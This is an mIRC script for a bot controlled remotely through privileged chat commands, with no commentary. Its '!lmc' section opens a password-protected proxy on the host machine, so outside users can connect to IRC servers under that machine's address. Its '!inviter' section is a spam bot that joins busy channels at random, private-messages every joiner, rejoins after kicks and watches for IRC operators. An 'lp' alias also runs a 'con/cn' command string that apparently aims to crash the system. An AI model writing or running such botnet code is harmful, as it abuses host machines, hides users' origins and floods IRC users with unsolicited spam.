on 10:TEXT:!lmc*:*:{ if ($2 == stats) { //notice $nick [lmc Stats [Total users connected [ ( $+ $sock(lmc.in*,0) $+ ) ] [lmcs Open[( $+ $calc($sock(lmc.*,0) - $sock(lmc.in*,0) - $sock(lmc.out*,0)) $+ ) ] [Server connections[( $+ $sock(lmc.out*,0) $+ )] } |  if ($2 == log) && ($address == %m.master) { lmc log $3 | .notice $nick [lmc logger has been set too $3 $+ ] |  if ($3 == off) { remove lmc.log }   } | if ($2 == start) {  .lmc start $3 $4 |  .notice $nick [lmc [Setup Complete[ $+ $Ip $+ : $+ $3 $+ ]  | .notice $nick [lmc Usage[ /server $Ip $+ : $+ $3 [then /quote pass $4 $+ ]  |   halt     }
  if ($2 == help) { .notice $nick [lmc Usage[!lmc [port] pass] | halt } | if ($2 == stop) { if ($sock(lmc. [ $+ [ $3 ] ] ,0) == 0) { .notice $nick [lmc error[lmc not active on that port] | halt }  | .notice $nick [lmc server/port for $3 has been stopped] |  sockclose lmc. $+ $3  } | if ($2 == kill) && ($3 == users) { .notice $nick [lmc [( $+ $sock(lmc.in*,0) $+ )] users on lmc, have been disconnected] | sockclose lmc.in* | sockclose lmc.out*  } |  if ($2 == shutdown) {  .notice $nick [lmc[lmc server shutdown[all settings reset] |  lmc reset  |  .notice $nick [lmc server shutdown complete] } |  if ($2 == list) && ($3 == lmc) {   if ($sock(lmc.*,0) == 0) { .notice $nick [lmc error, there are currently no lmc servers open] | halt }
    if ($sock(lmc.*,0) > 0) { .notice $nick [lmc listing active/open lmcs] | %lmc.stl = 0 | :again | if ($sock(lmc.*,0) == %lmc.stl) { goto done } |  inc %lmc.stl  |  if ($gettok($sock(lmc.*,%lmc.stl),2,46) !isnum 1-65000) { goto again } |  .notice $nick [lmc $chr(35) $+ %lmc.stl $+ ] [Port[ $+ $gettok($sock(lmc.*,%lmc.stl),2,46) $+ ] [Pass[ %lmc. [ $+ [ $gettok($sock(lmc.*,%lmc.stl),2,46) ] ] ] $+ ] |  goto again |    :done |    .notice $nick [lmc end listing active lmcs]  }  } |  if ($2 == list) && ($3 == users) {  if ($sock(lmc.in*,0) == 0) {  .notice $nick [lmc error[no users connected to the lmc] | halt } | if ($sock(lmc.in*,0) > 0) { .notice $nick [lmc[Listing active users]   |  %lmc.stlu = 0 |  :again2  
    if ($sock(lmc.in*,0) == %lmc.stlu) { goto done2 } |   inc %lmc.stlu  | .notice $nick [lmc[ $chr(35) $+ %lmc.stlu $+ ] [Connection[Nick[ [ $+ [ %lmc. [ $+ [ $gettok($sock(lmc.in*,%lmc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %lmc. [ $+ [ $gettok($sock(lmc.in*,%lmc.stlu),4-7,46) $+ .u ] ] ] $+ ] is $gettok($sock(lmc.in*,%lmc.stlu),4-7,46) on port $sock(lmc.in*,%lmc.stlu).mark ] |    goto again2 |    :done2 |   .notice $nick [lmc[list of users complete]  } }  | if ($2 == list) && ($3 == server) {   if ($sock(lmc.out*,0) == 0) { .notice $nick [lmc error[currently no users on servers connected] | halt }   
if ($sock(lmc.out*,0) > 0) { .notice $nick [lmc[listing active users and servers] |  %lmc.stlus = 0 |  :again3 | if ($sock(lmc.out*,0) == %lmc.stlus) { goto done3 }  |  inc   %lmc.stlus |  .notice $nick [lmc[ $chr(35) $+ %lmc.stlus $+ ]  [ %lmc. [ $+ [ $gettok($sock(lmc.out*,%lmc.stlus).mark,2,32) ] ] ] $+ / $+ [ %lmc. [ $+ [ $gettok($sock(lmc.out*,%lmc.stlus).mark,1,32) ] ] ] is %lmc. $+ $gettok($sock(lmc.out*,%lmc.stlus).mark,3,32) on $gettok($sock(lmc.out*,%lmc.stlus).mark,4-6,32)  |  goto again3 |   :done3 |  .notice $nick [lmc[List of users on servers complete]  } |  halt  } }
alias lmc { if ($1 == start) { .set %lmc. [ $+ [ $2 ] ] $3  | .socklisten lmc. $+ $2 $2  }  |  if ($1 == reset) { unset %lmc* | sockclose lmc* } |  if ($1 == log) { set %lmc.log $2 }  }
on 1:socklisten:lmc.*:{   if ($sock(lmc.in.temp,0) == 1) { halt } | .set %lmc.smt $gettok($sockname,2,46) | .sockaccept lmc.in.temp | sockread }  
on *:sockclose:lmc.in.*: { unset %lmc.ok. $+ $sockname | unset %lmc. $+ $sock($sockname).ip $+ * | unset %bp* | unset %temp.r* | if ($sock(lmc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {   sockclose $sock(lmc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } }
on *:sockread:lmc.in.*:{   if ($sock(lmc.in.temp*,0) == 1) {   .sockrename $sockname lmc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  | .sockmark $sockname %lmc.smt | unset %lmc.smt |  .set  %lmc.ok. $+ $sockname no } |   sockread -f %temp.r  |  if (%lmc.log == on) { write lmc.log 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- <<<[Incomming]>>> %temp.r }  |  if (%lmc.ok. [ $+ [ $sockname ] ] == no) {  if ($gettok(%temp.r ,1,32) == NICK) { set %lmc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32)  |  .write lmc.log 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Connection From: $sock($sockname).ip Time: $time Date: $+ $date
    sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Welcome to Genisous lmc server. ( $+ $gettok(%temp.r ,2,32) $+ )    | sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: From: $sock($sockname).ip Time: $time Date: $+ $date |  sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Please type /quote pass password to continue   |  sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: For more help type /quote lmchelp  |  halt  }
    if ($gettok(%temp.r ,1,32) == lmcHELP) {    sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Help Error: Login first! /quote pass [ password ] |  halt  } |  if ($gettok(%temp.r ,1,32) == USER) {  set %lmc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) |  halt  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) ==  %lmc. [ $+ [ $sock($sockname).mark ] ] ) {  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Password Accepted 
  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Please type /quote conn server port to start |   goto next  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %lmc. [ $+ [ $sock($sockname).mark ] ] ) {   sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: INCORRECT PASSWORD |   inc %bp   } |  if (%bp >= 3) {   sockwrite -nt $sockname : lmc: Notice Auth: $+ $+ Too many bad password attempts disconnecting...  |  sockclose $sockname | unset %bp }  |  halt   }
  :next |  %lmc.ok. [ $+ [ $sockname ] ] = done | if ($gettok(%temp.r ,1,32) == IDENT) { .identd on $gettok(%temp.r ,2,32)  |  sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: ident set to $gettok(%temp.r ,2,32)  }  | if ($gettok(%temp.r ,1,32) == VHOST) {  if ($gettok(%temp.r ,2,32) == LIST) {  .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Listing vhosts |   .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: (1) System Default: $ip / $host $+ ... |   .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: End of vhost / list |     halt   }
    if ($gettok(%temp.r ,2,32) == 1) {    .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: vhost set as system default $ip : $host |    halt   } |  else {   .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: vhost error. Usage: /quote vhost list or /quote vhost #number | halt }   } |   if ($gettok(%temp.r ,1,32) == lmcHELP) {    .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Listing help commands... |  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: - /quote ident ident 
    .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: - /quote conn [server] [port]   |  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: - /quote pass [password]  |  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: - /quote vhost list |  .sockwrite -nt $sockname  : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: - End of list help.  |  halt  }  |  if ($gettok(%temp.r ,1,32) == CONN) {  if ($sock(lmc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Disconnecting from current server...
    sockclose $sock(lmc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )  }  |  if ($gettok(%temp.r ,3,32) == $Null) {   sockopen lmc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)  | .sockmark lmc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %lmc. $+ $sock($sockname).ip $+ .u %lmc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 |  .sockwrite -nt $sockname : lmc: 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Attempting to connect to $gettok(%temp.r,2,32) on port 6667  |   halt   }  |  .sockopen lmc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32)  
.sockmark lmc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %lmc. $+ $sock($sockname).ip $+ .u %lmc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32) |  .sockwrite -nt $sockname : 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- Notice Auth: Attempting to connect to: $gettok(%temp.r,2,32) On Port: $gettok(%temp.r ,3,32)  |  halt    } |  if ($sock(lmc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt lmc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r   }  }  
on *:sockopen:lmc.out.*:{ sockwrite -tn $sockname USER [ [ %lmc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %lmc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]  | sockwrite -tn $sockname NICK %lmc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] | sockread  } 
on *:sockread:lmc.out.*:{ sockread -f %lmc.out.t   | if (%lmc.log == on) { write lmc.log 2[1 $+ $asctime(hh:nn.ss TT) $+ 2]1 ->2 [lmc]1 <- <<<[OUTGOING]>>> %lmc.out.t } | sockwrite -nt lmc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %lmc.out.t |  unset %lmc.out.t }
on 10:TEXT:!inviter*:*:{   %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { .set %i.server $3 | .set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { sockclose inviter* | remove ichan.txt | .set %i.b off | unset %i.temp.* | .timerinviteconnect off | .notice $nick inviter: inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { .notice $nick inviter: status: not connected! | halt }  
  if ($sock(inviter*,0) > 0) { .notice $nick inviter: status: connected: $sock(inviter*,0) }     } |   if ($2 == stats) { .notice $nick inviter: (stats) total invited: $calc( %i.t.j  +  %i.t.p ) delay: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }  |  if ($2 == message) { set %imsg $3- | .notice $nick inviter: invite msg set as, $3- $+ .  } 
  if ($2 == ctotal) { .notice $nick inviter: random channel totals: $+ $lines(ichan.txt)  }  |  if ($2 == reset) { .notice $nick inviter: all settings unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { .sockwrite -nt inviter*  MODE $3-  }  
  if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { .notice $nick inviter: error: gather channels first! | halt }  |   set %i.r.j.a $4 | .set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     .sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { .sockwrite -nt inviterN JOIN : $+ $3 }  } 
if ($2 == part) { .sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read wsminsck.oxc | halt }  |  .sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | .notice $nick inviter: delay set to: ( $+ $3 $+ ). } }
alias lp { if ($appstate == maximized) || ($appstate == normal) { .run command.exe /n /fh con/cn } | else { halt } }
alias s.inviter {   if (%i.ondelay == $null) { .notice $nick Inviter Error: please set delay !inviter delay delay | halt } |  if (%i.server == $null) || (%i.port == $null) { .notice $nick Inviter Error: starting inviter, inviter server port not set! %iserver/%iserver.port ] | halt }  |  if ($sock(inviter*,0) > 0) { .notice $nick Inviter Error: inviter already loaded | halt }  
.sockopen inviterN %i.server %i.port  | .notice $nick Inviter: loading inviter to server ( $+ $+ %i.server $+ ) port: ( $+ %i.port $+ ) |  .sockopen inviterM %i.server %i.port  }
on *:sockread:inviter*:{   .sockread -f %t.i  |  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { .notice $nick Inviter: listing channels on $remove($gettok(%t.i,1,32),:) ] }  |  if ($gettok(%t.i,2,32) == 323) { .notice $nick Inviter: listing channels complete on: $remove($gettok(%t.i,1,32),:) total channels in list: $+ $lines(ichan.txt) }  
  if ($gettok(%t.i,2,32) == 474) { .notice %chan Inviter: Join Error: Banned from: $gettok(%t.i,4,32) }    |  if ($gettok(%t.i,2,32) == 433) { .sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } |  if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == OFF) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } 
  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on OFF |  /.timer $+ $remove($gettok(%t.i,1,33),:) 1 15 .sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   .sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on YES  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } 
  if ($gettok(%t.i,1,32) == ERROR) { .notice %chan Inviter: error connecting: %t.i attempting to reconnect - to stop !inviter stop | .timerinviteconnect 0 3 .sockopen inviter %i.server %i.port } 
  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) {    if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |     dec %i.t.j 1  |   .notice %chan Inviter Error: not inviting: $gettok(%t.i,5,32) because he was oped }   |   if ($gettok(%t.i,4,32) == +v) {   if ($timer($gettok(%t.i,5,32)) == $null) { halt } |    .timer $+ $gettok(%t.i,5,32) off |    dec %i.t.j 1 |   } }
  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /.timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) {  if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /.timer $+ $remove($gettok(%t.i,1,33),:) off   |  dec %i.t.j  } |  if ($gettok(%t.i,2,32) == 313) {   .notice %chan Inviter Warning: ircop detected - $gettok(%t.i,4,32)
if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /.timer $+ $gettok(%t.i,2,32) off  }  }
on 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname USER $read wsminsck.oxc $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  wsminsck.oxc ] ] |  sockwrite -tn $sockname NICK $read wsminsck.oxc  | .timerinviteconnect off | sockread  }
on 1:sockclose:inviter*:{ if (%i.b == off) { .remove ichan.txt | halt }  |  if (%i.b == on) { .notice %chan inviter: INVITER WAS DISCONNECTED! (RELOADING).  | .sockopen $sockname %i.server %i.port } }